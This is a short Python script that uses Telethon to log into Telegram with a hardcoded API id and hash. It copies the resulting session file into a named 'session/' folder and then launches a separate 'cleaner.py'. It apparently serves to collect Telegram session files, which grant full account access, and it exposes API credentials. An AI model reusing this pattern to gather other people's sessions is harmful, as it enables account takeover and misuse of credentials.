from telethon import TelegramClient, events, sync
import os
import shutil
import time
import subprocess
banner = """
 ____________________________________________________
|                                                    |
|                     Dont WORIIIE                   |
|____________________________________________________|
"""
print(banner)
api_id = '27081922'
api_hash = '402702c34e957d67bc1a9a61925ebf72'

names = input("Session name: ")
with TelegramClient('client', api_id, api_hash) as client:
    shutil.copyfile("client.session", f"session/{names}.session")
    time.sleep(3)


subprocess.Popen(['python', 'cleaner.py', 'argzzz1', 'argzzz2'])